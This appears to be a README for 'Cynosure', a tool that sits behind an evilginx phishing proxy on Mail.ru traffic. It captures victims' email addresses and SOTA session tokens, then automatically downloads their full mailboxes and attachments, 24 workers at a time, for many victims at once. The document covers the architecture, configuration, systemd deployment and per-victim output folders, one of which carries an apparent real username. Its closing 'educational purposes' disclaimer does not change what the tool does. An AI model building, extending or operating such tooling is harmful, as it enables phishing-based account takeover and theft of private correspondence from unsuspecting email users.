# Mail.ru Cynosure - Multi-User Email Thread Downloader

A sophisticated MITM-based system for downloading email threads and attachments from Mail.ru accounts. The system supports multiple concurrent users with session-based isolation and automatic cleanup.

## 🚀 Overview

Cynosure is a modular addon system that intercepts Mail.ru API traffic, extracts authentication tokens, collects thread IDs, and downloads complete email threads with attachments. The system is designed to handle multiple users simultaneously without conflicts.

## 🏗️ Architecture

### Core Components

1. **Session Manager** - Manages multiple concurrent user sessions
2. **Email Extractor** - Extracts user email addresses from API requests
3. **Auth Extractor** - Extracts SOTA authentication tokens from HTML responses
4. **Thread Collector** - Collects thread IDs with pagination support
5. **Thread Downloader** - Downloads threads and attachments in parallel
6. **Main Orchestrator** - Coordinates the entire flow per session
7. **Service Manager** - Handles systemd service status and logging

### Session-Based Architecture

The system uses a session-based approach where each user gets their own isolated session:

```
User A → Session A → Download Threads → Session Complete
User B → Session B → Download Threads → Session Complete
User C → Session C → Download Threads → Session Complete
```

## 🔄 How It Works

### 1. Traffic Interception

- MITM proxy intercepts all Mail.ru API traffic
- Filters responses to avoid processing large files
- Extracts relevant data from API calls

### 2. User Session Creation

- When a user's email is detected, a new session is created
- Session contains: username, SOTA token, thread IDs, progress tracking
- Sessions are automatically cleaned up when expired or stale

### 3. Data Collection Flow

```
Email Detection → Session Creation → Token Extraction → Thread Collection → Download Execution
```

### 4. Thread Download Process

- Downloads threads in parallel (24 workers by default)
- Processes attachments separately
- Creates organized directory structure per user
- Tracks progress per session

### 5. Session Management

- Automatic cleanup of expired sessions (24 hours max age)
- Automatic cleanup of stale sessions (30 minutes idle)
- Session isolation prevents data conflicts
- Real-time session statistics and monitoring

## 👥 Multi-User Handling

### Session Isolation

Each user gets a completely isolated session with:

- **Unique Session ID**: `session_{username}_{timestamp}`
- **Separate State**: Email, token, thread IDs, progress
- **Independent Execution**: Downloads don't interfere with each other
- **Individual Error Handling**: Errors in one session don't affect others

### Concurrent Processing

- Multiple users can be processed simultaneously
- Each session executes independently
- No service restarts needed between users
- Automatic resource management and cleanup

### Session Lifecycle

```
1. User connects → Email detected → Session created
2. Token extracted → Added to session
3. Threads collected → Added to session
4. Download triggered → Progress tracked
5. Download complete → Session marked complete
6. Session cleanup → Resources freed
```

## 📁 File Structure

```
cynosure/
├── session_manager.py          # Multi-user session management
├── session_execution_state.py  # Per-session execution tracking
├── main_orchestrator.py        # Flow coordination
├── email_extractor.py          # Email address extraction
├── auth_extractor.py           # SOTA token extraction
├── thread_collector.py         # Thread ID collection
├── thread_downloader.py        # Thread and attachment download
├── service_manager.py          # Service status management
├── shared_utils.py             # Common utilities
├── config.py                   # Configuration settings
├── execution_state.py          # Legacy execution state
├── error_classifier.py         # Error classification
├── health_monitor.py           # Health monitoring
└── addons.py                   # Main addon loader
```

## ⚙️ Configuration

### Session Configuration (`SESSION_CONFIG`)

```python
SESSION_CONFIG = {
    "max_retries": 3,                    # Max retry attempts per session
    "retry_delay_base": 60,              # Base retry delay (seconds)
    "retry_delay_multiplier": 2,         # Exponential backoff multiplier
    "max_retry_delay": 3600,             # Max retry delay (1 hour)
    "max_execution_time": 86400,         # Max execution time (24 hours)
    "max_consecutive_errors": 5,         # Max consecutive errors
    "rate_limit_duration": 300,          # Rate limit duration (5 minutes)
    "stuck_threshold": 1800,             # Stuck detection threshold (30 minutes)
    "health_check_interval": 300,        # Health check interval (5 minutes)
    "session_max_age_hours": 24,         # Max session age (24 hours)
    "session_max_idle_minutes": 30,      # Max idle time (30 minutes)
}
```

### Service Configuration (`SERVICE_CONFIG`)

```python
SERVICE_CONFIG = {
    "service_name": "cynosure",          # Systemd service name
    "enable_health_monitoring": True,    # Enable health monitoring
    "enable_retry_logic": True,          # Enable retry logic
}
```

### Addon Configuration (`ADDON_CONFIG`)

```python
ADDON_CONFIG = {
    "url_rewriter": True,                # Fix evilginx domain issues
    "email_extractor": True,             # Extract email from URL parameters
    "auth_extractor": True,              # Extract SOTA tokens from HTML
    "thread_collector": True,            # Collect thread IDs with pagination
    "main_orchestrator": True,           # Coordinate and execute main flow
}
```

## 🚀 Usage

### 1. Service Installation

```bash
# Install as systemd service
sudo systemctl enable cynosure
sudo systemctl start cynosure
```

### 2. Service Management

```bash
# Check service status
systemctl status cynosure

# View logs
journalctl -u cynosure -f

# Restart service (if needed)
sudo systemctl restart cynosure
```

### 3. Configuration

Edit `/config.py` to modify:

- Session timeouts
- Retry logic
- Performance settings
- Addon enablement

### 4. Monitoring

The system provides real-time monitoring through:

- **Service Logs**: `journalctl -u cynosure -f`
- **Session Statistics**: Available via orchestrator status
- **Health Monitoring**: Automatic health checks every 5 minutes

## 📊 Output Structure

### Directory Layout

```
thread_details/
└── 2025-09-20_190136_ilya_bykov_717188_mail_ru/
    ├── 1_39644e8b3085540b_0.json
    ├── 1_39644e8b3085540b_0_attachments/
    │   ├── document.pdf
    │   └── image.jpg
    ├── 1_13444bb799af2010_0.json
    └── ...
```

### File Naming Convention

- **Thread Files**: `{thread_id}.json`
- **Attachment Directories**: `{thread_id}_attachments/`
- **Session Directories**: `{timestamp}_{username}/`

## 🔍 Monitoring and Debugging

### Session Statistics

The system tracks:

- Total active sessions
- Sessions currently downloading
- Sessions ready for download
- Completed sessions
- Per-session progress and status

### Log Messages

Key log patterns to monitor:

```
[+] Email extracted from e.mail.ru: user@mail.ru (session: session_user_1234567890)
[+] SOTA token extracted: token_value (session: session_user_1234567890)
[+] Added 65 thread IDs to session session_user_1234567890 (total: 65)
[+] Starting to process 65 threads for session session_user_1234567890 with 24 workers
[+] Thread download complete for session session_user_1234567890: 65/65 saved
```

### Error Handling

The system handles various error types:

- **Rate Limiting**: Automatic retry with exponential backoff
- **Authentication Errors**: Session marked as completed
- **Server Errors**: Retry with backoff
- **Network Errors**: Automatic retry

## 🛠️ Troubleshooting

### Common Issues

1. **Service Not Starting**

   ```bash
   # Check service status
   systemctl status cynosure

   # Check logs for errors
   journalctl -u cynosure --since "1 hour ago"
   ```

2. **No Threads Downloaded**

   - Verify email extraction is working
   - Check SOTA token extraction
   - Ensure thread collection is enabled

3. **Sessions Not Completing**

   - Check for rate limiting
   - Verify authentication tokens
   - Monitor session statistics

4. **High Memory Usage**
   - Check for stuck sessions
   - Verify automatic cleanup is working
   - Monitor session count

### Debug Mode

Enable detailed logging by modifying the Logger class in `shared_utils.py` to increase verbosity.

## 🔧 Advanced Configuration

### Performance Tuning

```python
# In thread_downloader.py
max_workers = 24  # Adjust based on system resources

# In session_manager.py
cleanup_interval = 300  # 5 minutes cleanup interval
```

### Custom Addon Development

Create new addons by:

1. Inheriting from the base addon class
2. Implementing `request()` and `response()` methods
3. Adding to `ADDON_CONFIG` in `config.py`
4. Registering in `addons.py`

## 📈 Performance Characteristics

- **Concurrent Users**: Supports unlimited concurrent users
- **Download Speed**: 24 parallel workers per session
- **Memory Usage**: Automatic cleanup prevents memory leaks
- **Session Isolation**: Complete data isolation between users
- **Error Recovery**: Automatic retry with exponential backoff
- **Resource Management**: Automatic cleanup of expired sessions

## 🔒 Security Considerations

- **Session Isolation**: Complete data separation between users
- **Token Management**: SOTA tokens are session-specific
- **Automatic Cleanup**: Sensitive data is automatically cleaned up
- **Error Handling**: No sensitive data in error logs
- **Resource Limits**: Built-in protection against resource exhaustion

## 📝 License and Support

This system is designed for educational and research purposes. Ensure compliance with Mail.ru's terms of service and applicable laws when using this tool.

For support and questions, refer to the system logs and configuration files for detailed information about the system's operation.
